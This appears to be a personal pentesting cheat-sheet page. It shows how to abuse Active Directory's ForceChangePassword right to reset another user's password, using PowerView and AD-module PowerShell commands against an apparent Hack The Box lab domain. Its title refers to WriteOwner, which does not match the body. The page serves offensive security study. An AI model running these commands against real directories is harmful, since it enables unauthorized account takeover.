---
title: Windows - Abusing WriteOwner permission
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - privilege escalation
  - windows
  - writeowner
---

# windows ForceChangePassword Permission


When a user has **`ForceChangePassword`** (a.k.a. _Reset Password_) permission over another user account in Active Directory they can reset the target user's password without knowing the current password.

![[forcechangepassword.png]]

The user can change their password. Several ways:

### 1. PowerView (PowerSploit)

Set-DomainUserPassword comes from PowerView (offensive tooling), not Microsoft.

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('GARFIELD.HTB\l.wilson_adm', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
```

Or:

```
$NewPassword = ConvertTo-SecureString 'Lala123' -AsPlainText -Force
Set-DomainUserPassword -Identity 'ca_svc' -AccountPassword $NewPassword
```

### 2. Active Directory Module (Recommended)

```
$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force 
Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $newpass -Reset
```

Alternative:

```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('GARFIELD.HTB\l.wilson_adm', $SecPassword)

$newpass = ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force 
Set-ADAccountPassword -Identity andy -NewPassword $newpass -Reset -Credential $Cred
```
